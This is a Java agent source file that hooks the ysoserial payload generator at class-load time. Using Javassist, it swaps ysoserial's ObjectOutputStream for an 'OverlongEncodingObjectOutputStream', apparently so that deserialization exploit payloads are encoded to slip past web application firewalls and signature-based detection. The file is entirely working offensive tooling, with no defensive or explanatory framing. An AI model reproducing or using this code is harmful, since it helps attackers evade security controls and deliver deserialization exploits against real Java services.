package org.example;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

import javassist.*;
import javassist.expr.ExprEditor;
import javassist.expr.NewExpr;

public class MyAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new ClassFileTransformer() {
            @Override
            public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                                    ProtectionDomain protectionDomain, byte[] classfileBuffer) {
                if (className.equals("ysoserial/Serializer")) {
                    try {
                        return modifyClass(className, loader);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return classfileBuffer;
            }

            private byte[] modifyClass(String className, ClassLoader loader) throws Exception {
                ClassPool pool = ClassPool.getDefault();
                CtClass cc = pool.get(className.replace("/", "."));

                // 查找并修改对应的方法
                CtMethod method = cc.getDeclaredMethod("writeClassDescriptor");
                method.insertBefore("{ System.out.println(\"Before method execution\"); }");
                method.insertAfter("{ System.out.println(\"After method execution\"); }");

                // 替换 ObjectOutputStream
                method.instrument(new ExprEditor() {
                    public void edit(NewExpr e) throws CannotCompileException {
                        if (e.getClassName().equals("java.io.ObjectOutputStream")) {
                            e.replace("{ $_ = new org.example.OverlongEncodingObjectOutputStream($$); }");

                        }

                    }
                });

                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            }
        });
    }
}
